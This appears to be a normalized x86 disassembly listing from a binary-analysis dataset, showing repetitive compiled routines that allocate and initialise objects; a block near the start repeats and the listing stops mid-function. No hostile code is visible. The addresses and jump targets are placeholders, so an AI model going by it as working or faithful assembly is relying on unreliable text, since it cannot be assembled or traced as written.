jbe r-xdata
push 0x10
pop esi
jmp r-xdata
add esi esi
and [ ebp - 0x50 ] 0x0
push 0x1
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x34 ]
dec edi
call sub_10008213
mov ecx eax
call sub_10042d0f
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
xor esi esi
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x38 ] eax
cmp edi esi
jbe r-xdata
mov eax [ ebp + 0xc ]
mov edi [ ebp - 0x40 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
push esi
push 0x1
lea ecx [ ebp - 0x34 ]
mov [ edi + 0x4 ] eax
call sub_100020e2
mov eax edi
call sub_1002b392
retn 0x20
add ebx 0xc
xor eax eax
jle r-xdata
push ebx
lea eax [ ebp - 0x50 ]
push eax
push edi
lea ecx [ ebp - 0x3c ]
call sub_10006ccf
push eax
lea eax [ ebp - 0x44 ]
push eax
call sub_1002260b
add esp 0x14
cmp eax 0xfffffffd
je r-xdata
push eax
lea ecx [ ebp - 0x3c ]
sub edi eax
call sub_10042597
push [ ebp - 0x44 ]
lea ecx [ ebp + 0xc ]
call sub_10005f27
cmp edi esi
ja r-xdata
cmp eax esi
jl r-xdata
jne r-xdata
cmp [ ebp - 0x44 ] si
jne r-xdata
lea ecx [ ebp - 0x3c ]
call sub_10006ccf
push eax
call sub_10027160
pop ecx
inc eax
jmp r-xdata
sub_10043822
push 0x4c
mov eax sub_1004ee53
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov esi r--data
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp + 0x1c ]
mov ebx ecx
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x38 ] eax
movsb [ edi ] [ esi ]
call sub_100082a7
mov al [ ebp + 0x24 ]
and [ ebp - 0x4 ] 0x0
test al al
jne r-xdata
mov [ ebp - 0x16 ] al
mov al [ ebp + 0x20 ]
mov [ ebp - 0x15 ] al
mov al [ ebp + 0x20 ]
mov [ ebp - 0x16 ] al
jmp r-xdata
push 0x0
push esi
lea ecx [ ebp - 0x34 ]
call sub_100014aa
mov eax [ ebp - 0x20 ]
mov edi [ ebx + 0x8 ]
mov [ ebp - 0x48 ] eax
lea eax [ ebp - 0x58 ]
push eax
lea ecx [ ebp - 0x34 ]
call sub_10008213
mov ecx eax
call sub_10006ccf
push edi
push [ ebp - 0x38 ]
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp - 0x48 ]
push eax
call sub_100367d7
mov edi eax
add esp 0x14
test edi edi
jbe r-xdata
push 0x10
pop esi
jmp r-xdata
add esi esi
and [ ebp - 0x50 ] 0x0
push 0x1
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x34 ]
dec edi
call sub_10008213
mov ecx eax
call sub_10042d0f
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
xor esi esi
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x38 ] eax
cmp edi esi
jbe r-xdata
mov eax [ ebp + 0xc ]
mov edi [ ebp - 0x40 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
push esi
push 0x1
lea ecx [ ebp - 0x34 ]
mov [ edi + 0x4 ] eax
call sub_100020e2
mov eax edi
call sub_1002b392
retn 0x20
add ebx 0xc
xor eax eax
jle r-xdata
push ebx
lea eax [ ebp - 0x50 ]
push eax
push edi
lea ecx [ ebp - 0x3c ]
call sub_10006ccf
push eax
lea eax [ ebp - 0x44 ]
push eax
call sub_1002260b
add esp 0x14
cmp eax 0xfffffffd
je r-xdata
push eax
lea ecx [ ebp - 0x3c ]
sub edi eax
call sub_10042597
push [ ebp - 0x44 ]
lea ecx [ ebp + 0xc ]
call sub_100423a5
cmp edi esi
ja r-xdata
cmp eax esi
jl r-xdata
jne r-xdata
cmp [ ebp - 0x44 ] si
jne r-xdata
lea ecx [ ebp - 0x3c ]
call sub_10006ccf
push eax
call sub_10027160
pop ecx
inc eax
jmp r-xdata
sub_10043963
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
push 0x0
mov [ esi + 0x18 ] 0x7
call sub_10042957
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0x8 ]
call sub_100433e0
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1004398d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
push 0x0
mov [ esi + 0x18 ] 0x7
call sub_10042957
push [ ebp + 0x8 ]
mov ecx esi
call sub_10043456
mov eax esi
pop esi
pop ebp
retn 0x4
sub_100439b4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
push 0x0
mov [ esi + 0x18 ] 0x7
call sub_10042957
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0x8 ]
call sub_10043477
mov eax esi
pop esi
pop ebp
retn 0x8
sub_100439de
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
push 0x0
mov [ esi + 0x18 ] 0x7
call sub_10042957
push 0xffffffff
push 0x0
push [ ebp + 0x8 ]
mov ecx esi
call sub_1004334b
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10043a09
push 0x94
mov eax sub_1004ef03
call sub_1002b2a6
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x2
pop eax
call sub_1002b37e
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_1002738b
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1000792f
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_100078da
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_100417d8
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000794c
test [ ebp - 0x10 ] 0x2
mov [ ebp - 0x4 ] 0x2
mov [ esi ] eax
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
sub_10043aaa
push 0x94
mov eax sub_1004ef03
call sub_1002b2a6
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x2
pop eax
call sub_1002b37e
retn
cmp [ esi ] edi
jne r-xdata
push 0x20
call sub_1002738b
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1000792f
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_100078da
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_10041a90
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000794c
test [ ebp - 0x10 ] 0x2
mov [ ebp - 0x4 ] 0x2
mov [ esi ] eax
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
sub_10043b4b
push 0x94
mov eax sub_1004ef03
call sub_1002b2a6
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x5
pop eax
call sub_1002b37e
retn
cmp [ esi ] edi
jne r-xdata
push 0x14
call sub_1002738b
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1000792f
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_100078da
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_10041d80
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000794c
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
sub_10043bea
push 0x94
mov eax sub_1004ef03
call sub_1002b2a6
xor edi edi
xor ebx ebx
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
inc ebx
cmp esi edi
je r-xdata
mov eax ebx
call sub_1002b37e
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_1002738b
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1000792f
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] ebx
call sub_100078da
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_10041de4
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000794c
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push ebx
lea ecx [ ebp - 0x2c ]
call sub_100020e2
sub_10043c84
push 0x24
mov eax sub_1004ee91
call sub_1002b2a6
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
and [ ebp - 0x1c ] 0x0
mov [ ebp - 0x10 ] ecx
mov ecx esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x18 ] ebx
call sub_10001bdf
and [ ebp - 0x4 ] 0x0
mov eax ebx
sub eax edi
sar eax 0x1
mov [ ebp - 0x1c ] 0x1
je r-xdata
push 0x0
push eax
mov ecx esi
call sub_1001534a
mov eax esi
call sub_1002b37e
retn 0xc
mov ecx [ ebp - 0x10 ]
add ecx 0x8
mov [ ebp - 0x10 ] ecx
test eax eax
ja r-xdata
push 0x0
push eax
mov ecx esi
call sub_1001534a
lea eax [ ebp - 0x28 ]
push eax
mov ecx esi
call sub_10009d44
mov ecx eax
call sub_10006f37
mov edi [ esi + 0x14 ]
mov ebx eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx esi
call sub_10009d44
mov ecx eax
call sub_10006f37
push [ ebp - 0x10 ]
lea ecx [ ebx + edi * 2 ]
push [ ebp - 0x18 ]
push [ ebp - 0x14 ]
push ecx
push eax
call sub_1004df3d
add esp 0x14
cmp eax [ esi + 0x14 ]
jbe r-xdata
sub_10043d32
push 0x94
mov eax sub_1004ef03
call sub_1002b2a6
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
cmp edi ebx
je r-xdata
push 0x6
pop eax
call sub_1002b37e
retn
cmp [ edi ] ebx
jne r-xdata
push 0x8
call sub_1002738b
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] ebx
inc ebx
test esi esi
je r-xdata
xor esi esi
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1000792f
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] ebx
call sub_100078da
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x3
mov [ esi ] r--data
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000794c
push 0x2
pop eax
mov [ ebp - 0x4 ] eax
mov [ edi ] esi
test [ ebp - 0x10 ] al
je r-xdata
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_100020e2
sub_10043dea
push 0x94
mov eax sub_1004ef03
call sub_1002b2a6
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x3
pop eax
call sub_1002b37e
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_1002738b
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1000792f
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_100078da
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_10041e28
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000794c
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
sub_10043e89
push 0x94
mov eax sub_1004ef03
call sub_1002b2a6
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x3
pop eax
call sub_1002b37e
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_1002738b
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1000792f
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_100078da
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_10041e4b
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000794c
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
sub_10043f28
push 0x94
mov eax sub_1004f65c
call sub_1002b2a6
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
push 0x3
pop esi
cmp edi ebx
je r-xdata
mov eax esi
call sub_1002b37e
retn
cmp [ edi ] ebx
jne r-xdata
push 0x34
call sub_1002738b
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] ebx
inc ebx
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1000792f
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] ebx
call sub_100078da
mov ecx [ ebp + 0x8 ]
push ebx
push 0x0
push eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x10 ] esi
call sub_10042fad
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000794c
test [ ebp - 0x10 ] 0x2
mov [ edi ] eax
mov [ ebp - 0x4 ] esi
je r-xdata
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_100020e2
sub_10044037
push 0x94
mov eax sub_1004f65c
call sub_1002b2a6
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
push 0x3
pop esi
cmp edi ebx
je r-xdata
mov eax esi
call sub_1002b37e
retn
cmp [ edi ] ebx
jne r-xdata
push 0x34
call sub_1002738b
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] ebx
inc ebx
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1000792f
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] ebx
call sub_100078da
mov ecx [ ebp + 0x8 ]
push ebx
push 0x0
push eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x10 ] esi
call sub_10042ff9
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000794c
test [ ebp - 0x10 ] 0x2
mov [ edi ] eax
mov [ ebp - 0x4 ] esi
je r-xdata
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_100020e2
sub_100440d6
push 0x94
mov eax sub_1004ef03
call sub_1002b2a6
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x4
pop eax
call sub_1002b37e
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_1002738b
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1000792f
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_100078da
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_10041e86
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000794c
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
sub_10044175
push 0x94
mov eax sub_1004ef03
call sub_1002b2a6
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x4
pop eax
call sub_1002b37e
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_1002738b
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1000792f
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_100078da
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_10041f66
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000794c
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
sub_10044214
push 0x98
mov eax sub_1004f917
call sub_1002b2a6
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x10 ] edi
cmp eax edi
je r-xdata
push 0x4
pop eax
call sub_1002b37e
retn
cmp [ eax ] edi
jne r-xdata
push 0x18
call sub_1002738b
pop ecx
mov [ ebp - 0x14 ] eax
xor ebx ebx
inc ebx
push 0x3
mov [ ebp - 0x4 ] edi
pop esi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x30 ]
push eax
call sub_1000792f
push eax
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] ebx
call sub_100078da
mov ecx [ ebp - 0x14 ]
push ebx
push edi
push eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x10 ] esi
call sub_10042bff
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa4 ]
call sub_1000794c
test [ ebp - 0x10 ] 0x2
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov [ ebp - 0x4 ] esi
je r-xdata
push edi
push ebx
lea ecx [ ebp - 0x30 ]
call sub_100020e2
sub_100442d3
push 0x94
mov eax sub_1004ef03
call sub_1002b2a6
xor edi edi
xor ebx ebx
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
inc ebx
cmp esi edi
je r-xdata
mov eax ebx
call sub_1002b37e
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_1002738b
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1000792f
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] ebx
call sub_100078da
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_10041fc2
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000794c
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push ebx
lea ecx [ ebp - 0x2c ]
call sub_100020e2
sub_1004436d
push 0x24
mov eax sub_1004eec5
call sub_1002b2a6
mov [ ebp - 0x10 ] ecx
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
and [ ebp - 0x1c ] 0x0
mov ecx esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x18 ] ebx
call sub_100430dd
and [ ebp - 0x4 ] 0x0
mov eax ebx
sub eax edi
sar eax 0x1
mov [ ebp - 0x1c ] 0x1
je r-xdata
push 0x0
push eax
mov ecx esi
call sub_10043558
mov eax esi
call sub_1002b37e
retn 0xc
mov ecx [ ebp - 0x10 ]
add ecx 0x8
mov [ ebp - 0x10 ] ecx
test eax eax
ja r-xdata
push 0x0
push eax
mov ecx esi
call sub_10043558
lea eax [ ebp - 0x28 ]
push eax
mov ecx esi
call sub_10042caf
mov ecx eax
call sub_10042004
mov edi [ esi + 0x14 ]
mov ebx eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx esi
call sub_10042caf
mov ecx eax
call sub_10042004
push [ ebp - 0x10 ]
lea ecx [ ebx + edi * 2 ]
push [ ebp - 0x18 ]
push [ ebp - 0x14 ]
push ecx
push eax
call sub_100420d5
add esp 0x14
cmp eax [ esi + 0x14 ]
jbe r-xdata
sub_1004441b
push 0x94
mov eax sub_1004ef03
call sub_1002b2a6
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
cmp edi ebx
je r-xdata
push 0x6
pop eax
call sub_1002b37e
retn
cmp [ edi ] ebx
jne r-xdata
push 0x8
call sub_1002738b
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] ebx
inc ebx
test esi esi
je r-xdata
xor esi esi
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1000792f
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] ebx
call sub_100078da
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x3
mov [ esi ] r--data
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000794c
push 0x2
pop eax
mov [ ebp - 0x4 ] eax
mov [ edi ] esi
test [ ebp - 0x10 ] al
je r-xdata
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_100020e2
sub_100444d3
push 0x94
mov eax sub_1004ef03
call sub_1002b2a6
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x3
pop eax
call sub_1002b37e
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_1002738b
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1000792f
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_100078da
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1004212a
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000794c
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
sub_10044572
push 0x94
mov eax sub_1004ef03
call sub_1002b2a6
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x3
pop eax
call sub_1002b37e
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_1002738b
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1000792f
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_100078da
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_100421bb
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000794c
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
sub_10044611
push 0x94
mov eax sub_1004f65c
call sub_1002b2a6
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
push 0x3
pop esi
cmp edi ebx
je r-xdata
mov eax esi
call sub_1002b37e
retn
cmp [ edi ] ebx
jne r-xdata
push 0x34
call sub_1002738b
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] ebx
inc ebx
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1000792f
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] ebx
call sub_100078da
mov ecx [ ebp + 0x8 ]
push ebx
push 0x0
push eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x10 ] esi
call sub_10043045
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000794c
test [ ebp - 0x10 ] 0x2
mov [ edi ] eax
mov [ ebp - 0x4 ] esi
je r-xdata
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_100020e2
sub_100446e8
push 0x94
mov eax sub_1004f65c
call sub_1002b2a6
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
push 0x3
pop esi
cmp edi ebx
je r-xdata
mov eax esi
call sub_1002b37e
retn
cmp [ edi ] ebx
jne r-xdata
push 0x34
call sub_1002738b
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] ebx
inc ebx
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1000792f
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] ebx
call sub_100078da
mov ecx [ ebp + 0x8 ]
push ebx
push 0x0
push eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x10 ] esi
call sub_10043091
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000794c
test [ ebp - 0x10 ] 0x2
mov [ edi ] eax
mov [ ebp - 0x4 ] esi
je r-xdata
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_100020e2
sub_10044787
push 0x94
mov eax sub_1004ef03
call sub_1002b2a6
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x5
pop eax
call sub_1002b37e
retn
cmp [ esi ] edi
jne r-xdata
push 0x14
call sub_1002738b
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1000792f
push eax
lea ecx [ ebp - 0xa0 ]
